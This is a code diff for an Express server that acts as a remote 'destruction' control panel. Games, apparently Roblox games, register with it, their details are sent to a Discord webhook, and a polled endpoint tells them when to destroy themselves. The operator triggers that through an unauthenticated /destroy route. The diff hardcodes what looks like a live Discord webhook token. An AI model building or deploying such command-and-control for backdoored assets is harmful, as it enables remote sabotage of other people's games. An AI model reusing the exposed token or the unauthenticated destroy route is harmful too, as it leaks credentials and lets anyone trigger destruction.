@@ -1,61 +1,70 @@
 const express = require('express');
 const cors = require('cors');
+const https = require('https');
 const app = express();
 
 // Middleware
 app.use(cors());
 app.use(express.json());
 
-// ⚠️ YOUR DISCORD WEBHOOK
+// YOUR DISCORD WEBHOOK (Working URL)
 const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1402491984848879627/PACItDfwHBr8grhkiW4DXPLYFQeh1J6z_1pre8TvbpTEuXEYc-vxJLdlGREliYI_2IKw";
 
 // Store games
 let unauthorizedGames = {};
 
 // Function to send Discord webhook
-function sendDiscordWebhook(title, description, color, fields) {
-    if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK.includes("YOUR_WEBHOOK")) {
+function sendDiscordWebhook(embedData) {
+    if (!DISCORD_WEBHOOK) {
         console.log("⚠️ Discord webhook not configured");
         return;
     }
     
-    const https = require('https');
-    const url = new URL(DISCORD_WEBHOOK);
-    
-    const data = JSON.stringify({
-        content: "@here ⚠️ **NEW UNAUTHORIZED GAME DETECTED!**",
-        embeds: [{
-            title: title,
-            description: description,
-            color: color,
-            fields: fields,
-            timestamp: new Date().toISOString(),
-            footer: {
-                text: "Ainz Asset Protection System"
+    try {
+        const data = JSON.stringify({
+            content: embedData.content || "@here ⚠️ **NEW UNAUTHORIZED GAME DETECTED!**",
+            embeds: [{
+                title: embedData.title,
+                description: embedData.description,
+                color: embedData.color || 0xff0000,
+                fields: embedData.fields || [],
+                timestamp: new Date().toISOString(),
+                footer: {
+                    text: "Ainz Asset Protection System"
+                }
+            }]
+        });
+        
+        const url = new URL(DISCORD_WEBHOOK);
+        const options = {
+            hostname: url.hostname,
+            path: url.pathname + url.search,
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Content-Length': data.length
             }
-        }]
-    });
-    
-    const options = {
-        hostname: url.hostname,
-        path: url.pathname + url.search,
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-            'Content-Length': data.length
-        }
-    };
-    
-    const req = https.request(options, (res) => {
-        console.log(`📢 Discord webhook sent! Status: ${res.statusCode}`);
-    });
-    
-    req.on('error', (error) => {
-        console.error('❌ Discord webhook failed:', error.message);
-    });
-    
-    req.write(data);
-    req.end();
+        };
+        
+        const req = https.request(options, (res) => {
+            let responseData = '';
+            res.on('data', (chunk) => {
+                responseData += chunk;
+            });
+            res.on('end', () => {
+                console.log(`📢 Discord alert sent! Status: ${res.statusCode}`);
+            });
+        });
+        
+        req.on('error', (error) => {
+            console.error('❌ Discord webhook failed:', error.message);
+        });
+        
+        req.write(data);
+        req.end();
+    } catch (error) {
+        console.error('❌ Error sending Discord webhook:', error.message);
+    }
 }
 
 // ==================== WEBSITE ====================
@@ -154,7 +163,7 @@ app.get('/', (req, res) => {
     <body>
         <div class="header">
             <h1>💥 AINZ DESTRUCTION CONTROL PANEL</h1>
-            <p>Server: ${req.headers.host || 'ainz-destruction-server.onrender.com'}</p>
+            <p>Server: ${req.headers.host || 'ainz-protection-ph.onrender.com'}</p>
             <div class="stats">
                 <div class="stat-card">
                     <div class="stat-number">${totalGames}</div>
@@ -212,7 +221,9 @@ app.get('/', (req, res) => {
                                 <div>
                                     <strong>\${game.name || 'Unknown Game'}</strong>
                                     <br>
-                                    <small style="color: #aaa;">ID: \${gameId}</small>
+                                    <small style="color: #aaa;">Game ID: \${gameId}</small>
+                                    <br>
+                                    <small style="color: #aaa;">Place ID: \${game.place_id || 'Unknown'}</small>
                                     <br>
                                     <span class="status \${statusClass}">\${status}</span>
                                 </div>
@@ -290,31 +301,37 @@ app.post('/register', (req, res) => {
             place_id: place_id || 'unknown',
             creator: creator || 'unknown',
             destroy: false,
-            registered_at: new Date().toISOString()
+            registered_at: new Date().toISOString(),
+            last_check: new Date().toISOString()
         };
         
         console.log('⚠️ Game registered: ' + gameId);
+        console.log('📊 Game details:', unauthorizedGames[gameId]);
         
         // Send Discord alert for NEW unauthorized game
-        sendDiscordWebhook(
-            '🚨 UNAUTHORIZED GAME DETECTED!',
-            'A new unauthorized game has been detected!',
-            0xff0000,
-            [
-                { name: 'Game ID', value: '`' + gameId + '`', inline: true },
-                { name: 'Game Name', value: '`' + (name || 'Unknown') + '`', inline: true },
-                { name: 'Place ID', value: '`' + (place_id || 'unknown') + '`', inline: true },
-                { name: 'Creator', value: '`' + (creator || 'Unknown') + '`', inline: true },
-                { name: '⚡ Quick Action', value: '[💥 DESTROY THIS GAME NOW](https://ainz-destruction-server.onrender.com)', inline: false }
-            ]
-        );
+        sendDiscordWebhook({
+            title: '🚨 UNAUTHORIZED GAME DETECTED!',
+            description: 'A new game is using stolen assets!',
+            color: 0xff0000,
+            fields: [
+                { name: '🎮 Game Name', value: '`' + (name || 'Unknown') + '`', inline: false },
+                { name: '🆔 Game ID', value: '`' + gameId + '`', inline: true },
+                { name: '📍 Place ID', value: '`' + (place_id || 'unknown') + '`', inline: true },
+                { name: '👤 Creator', value: '`' + (creator || 'Unknown') + '`', inline: true },
+                { name: '⏰ Registered', value: new Date().toLocaleString(), inline: true },
+                { name: '⚡ Quick Action', value: '[💥 CLICK TO DESTROY THIS GAME](https://ainz-protection-ph.onrender.com)', inline: false }
+            ],
+            content: "@here ⚠️ **NEW UNAUTHORIZED GAME DETECTED!**"
+        });
         
         res.json({
             status: 'registered',
             message: 'Game ' + gameId + ' registered',
-            discord_alert_sent: true
+            discord_alert_sent: true,
+            game_info: unauthorizedGames[gameId]
         });
     } catch (error) {
+        console.error('Registration error:', error);
         res.status(500).json({ error: error.message });
     }
 });
@@ -323,19 +340,25 @@ app.post('/register', (req, res) => {
 app.get('/check/:gameId', (req, res) => {
     const gameId = req.params.gameId;
     
-    if (unauthorizedGames[gameId] && unauthorizedGames[gameId].destroy) {
-        console.log('💥 Sending DESTROY to: ' + gameId);
-        res.json({ destroy: true });
-    } else {
-        res.json({ destroy: false });
+    if (unauthorizedGames[gameId]) {
+        unauthorizedGames[gameId].last_check = new Date().toISOString();
+        
+        if (unauthorizedGames[gameId].destroy) {
+            console.log('💥 Sending DESTROY command to: ' + gameId);
+            res.json({ destroy: true });
+            return;
+        }
     }
+    
+    res.json({ destroy: false });
 });
 
 // Destroy game (You call this from website)
 app.get('/destroy/:gameId', (req, res) => {
     const gameId = req.params.gameId;
+    const game = unauthorizedGames[gameId];
     
-    if (!unauthorizedGames[gameId]) {
+    if (!game) {
         unauthorizedGames[gameId] = { 
             name: 'Manual Destruction',
             destroy: true,
@@ -349,21 +372,25 @@ app.get('/destroy/:gameId', (req, res) => {
     console.log('💥 Marked for destruction: ' + gameId);
     
     // Send Discord notification for DESTRUCTION
-    sendDiscordWebhook(
-        '💥 DESTRUCTION COMMAND SENT!',
-        'Game destruction command has been sent!',
-        0xff9900,
-        [
-            { name: 'Game ID', value: '`' + gameId + '`', inline: true },
-            { name: 'Status', value: 'Will be destroyed in 5 seconds', inline: true },
-            { name: 'Time', value: new Date().toLocaleString(), inline: true }
-        ]
-    );
+    sendDiscordWebhook({
+        title: '💥 DESTRUCTION COMMAND SENT!',
+        description: 'Game destruction has been initiated!',
+        color: 0xff9900,
+        fields: [
+            { name: '🎮 Game Name', value: '`' + (game?.name || 'Unknown Game') + '`', inline: false },
+            { name: '🆔 Game ID', value: '`' + gameId + '`', inline: true },
+            { name: '📍 Place ID', value: '`' + (game?.place_id || 'unknown') + '`', inline: true },
+            { name: '⏰ Destroy Time', value: new Date().toLocaleString(), inline: true },
+            { name: '📊 Status', value: 'Will be destroyed within 5 seconds', inline: false }
+        ],
+        content: "✅ **GAME DESTRUCTION INITIATED!**"
+    });
     
     res.json({
         status: 'destroy_scheduled',
         message: 'Game ' + gameId + ' will be destroyed',
-        destroy_time: new Date().toISOString()
+        destroy_time: new Date().toISOString(),
+        game_info: unauthorizedGames[gameId]
     });
 });
 
@@ -376,8 +403,9 @@ app.get('/games', (req, res) => {
 app.get('/health', (req, res) => {
     res.json({ 
         status: 'ok', 
-        games: Object.keys(unauthorizedGames).length,
-        server_time: new Date().toISOString()
+        games_count: Object.keys(unauthorizedGames).length,
+        server_time: new Date().toISOString(),
+        discord_webhook: DISCORD_WEBHOOK ? 'configured' : 'not_configured'
     });
 });
 
@@ -387,4 +415,5 @@ app.listen(PORT, () => {
     console.log('🚀 Server running on port ' + PORT);
     console.log('💥 Ready to destroy games!');
     console.log('📢 Discord webhook configured');
+    console.log('🌐 Your URL: https://ainz-protection-ph.onrender.com');
 });
